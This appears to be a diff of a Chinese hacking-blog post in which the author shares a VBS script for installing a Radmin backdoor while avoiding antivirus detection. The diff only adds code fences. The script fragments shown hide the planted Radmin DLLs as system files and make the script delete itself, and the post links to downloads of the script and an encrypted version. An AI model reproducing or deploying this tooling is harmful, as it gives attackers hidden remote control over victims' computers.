@@ -13,7 +13,7 @@ ViewNums: 4921
 来源：红狼
 
 在网上看到N多人做 [radmin](/blog/radmin-31-server-crack-nosetup) [后门](/tags/%E5%90%8E%E9%97%A8)，要导出注册表而且还用被杀[软件](/tags/%E8%BD%AF%E4%BB%B6)K杀。所以本人把自己写的[脚本](/tags/%E8%84%9A%E6%9C%ACScript)提供大家分享。比较实用，希望大家喜欢。
-
+```
 on error resume next
 const HKEY_LOCAL_MACHINE = &H80000002
 strComputer = "."
@@ -80,7 +80,7 @@ c=wshshell.run ("attrib +r +h +s %systemroot%system32AdmDll.dll",0)
 d=wshshell.run ("attrib +r +h +s %systemroot%system32
 addrv.dll",0)
 CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName) //自删除
-
+```
 附件：
 [RAdmin.rar](http://201314.free.fr/attachments/200801/RAdmin.rar "http://201314.free.fr/attachments/200801/RAdmin.rar") (1014 Bytes)
 [Radmin VBS加密版.rar](http://201314.free.fr/attachments/200801/Radmin%20VBS%EF%BF%BD%EF%BF%BD%EF%BF%BD%DC%B0%EF%BF%BD.rar "http://201314.free.fr/attachments/200801/Radmin%20VBS%BC%D3%C3%DC%B0%E6.rar") (1.4 KB)
